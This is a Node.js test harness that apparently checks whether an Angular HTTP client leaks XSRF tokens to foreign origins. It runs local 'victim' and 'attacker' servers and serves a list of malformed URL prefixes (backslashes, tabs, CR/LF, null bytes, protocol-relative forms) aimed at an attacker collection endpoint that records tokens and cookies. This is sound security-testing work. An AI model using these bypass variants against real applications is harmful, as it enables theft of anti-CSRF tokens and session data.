import { randomBytes } from 'node:crypto';
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { dirname, extname, resolve, sep } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
const dist = resolve(root, 'dist/bypass-xsrf-token-http-client/browser');
const victimOrigin = 'http://127.0.0.1:4200';
const attackerOrigin = 'http://localhost:4301';
const attackerPath = 'localhost:4301/collect';
const attack = (id, prefix) => ({ id, href: `${prefix}${attackerPath}?id=${id}` });
const token = randomBytes(16).toString('hex');
const captures = { victim: [], attacker: [] };

function json(res, status, value, headers = {}) {
  res.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store',
    ...headers,
  });
  res.end(JSON.stringify(value));
}

async function drain(req) {
  for await (const chunk of req) void chunk;
}

function capture(req, id) {
  return {
    id,
    xsrf: req.headers['x-xsrf-token'] ?? null,
    cookie: req.headers.cookie ?? null,
  };
}

const victim = createServer(async (req, res) => {
  const url = new URL(req.url, victimOrigin);

  if (req.method === 'GET' && url.pathname === '/api/session') {
    return json(
      res,
      200,
      { ready: true },
      {
        'Set-Cookie': `XSRF-TOKEN=${token}; Path=/; SameSite=Lax`,
      },
    );
  }
  if (req.method === 'POST' && url.pathname === '/api/reset') {
    await drain(req);
    captures.victim.length = 0;
    captures.attacker.length = 0;
    return json(res, 200, { ok: true });
  }
  if (req.method === 'GET' && url.pathname === '/api/links') {
    return json(res, 200, [
      { id: 'same-origin', href: '/api/echo?id=same-origin' },
      attack('protocol-relative', '//'),
      { id: 'absolute', href: `${attackerOrigin}/collect?id=absolute` },
      attack('backslash', '/\\'),
      attack('backslash-slash', '\\/'),
      attack('leading-space', ' //'),
      attack('leading-tab', '\t//'),
      attack('leading-whitespace', ' \t//'),
      attack('inner-tab', '/\t/'),
      attack('inner-lf', '/\n/'),
      attack('inner-cr', '/\r/'),
      attack('leading-null', '\u0000//'),
      attack('leading-unit-separator', '\u001f//'),
      attack('http-double-backslash', 'http:\\\\'),
      attack('http-slash-backslash', 'http:/\\'),
      attack('http-scheme-tab', 'ht\ttp://'),
      { id: 'same-host-port', href: '/\\127.0.0.1:4302/collect?id=same-host-port' },
    ]);
  }
  if (req.method === 'POST' && url.pathname === '/api/echo') {
    await drain(req);
    captures.victim.push(capture(req, url.searchParams.get('id')));
    return json(res, 200, { ok: true });
  }
  if (req.method === 'GET' && url.pathname === '/api/results') {
    return json(res, 200, captures);
  }
  if (req.method === 'GET' && url.pathname === '/health') {
    return json(res, 200, { ok: true });
  }

  if (req.method !== 'GET') return json(res, 405, { error: 'method' });
  const path = resolve(
    dist,
    `.${decodeURIComponent(url.pathname === '/' ? '/index.html' : url.pathname)}`,
  );
  if (path !== dist && !path.startsWith(dist + sep)) return json(res, 403, { error: 'path' });
  try {
    const body = await readFile(path);
    const type =
      {
        '.html': 'text/html',
        '.js': 'text/javascript',
        '.css': 'text/css',
        '.ico': 'image/x-icon',
      }[extname(path)] ?? 'application/octet-stream';
    res.writeHead(200, { 'Content-Type': `${type}; charset=utf-8` });
    res.end(body);
  } catch {
    json(res, 404, { error: 'not found' });
  }
});

async function receiveAttack(req, res) {
  const url = new URL(req.url, attackerOrigin);
  const cors = {
    'Access-Control-Allow-Origin': victimOrigin,
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'content-type, x-xsrf-token',
    Vary: 'Origin',
  };
  if (req.method === 'OPTIONS') {
    res.writeHead(204, cors);
    return res.end();
  }
  if (req.method === 'POST' && url.pathname === '/collect') {
    await drain(req);
    captures.attacker.push(capture(req, url.searchParams.get('id')));
    return json(res, 200, { received: true }, cors);
  }
  return json(res, 404, { error: 'not found' }, cors);
}

victim.listen(4200, '127.0.0.1', () => console.log(`Victim: ${victimOrigin}`));
createServer(receiveAttack).listen(4301, 'localhost', () =>
  console.log(`Attacker: ${attackerOrigin}`),
);
createServer(receiveAttack).listen(4302, '127.0.0.1', () =>
  console.log('Same-host receiver: http://127.0.0.1:4302'),
);
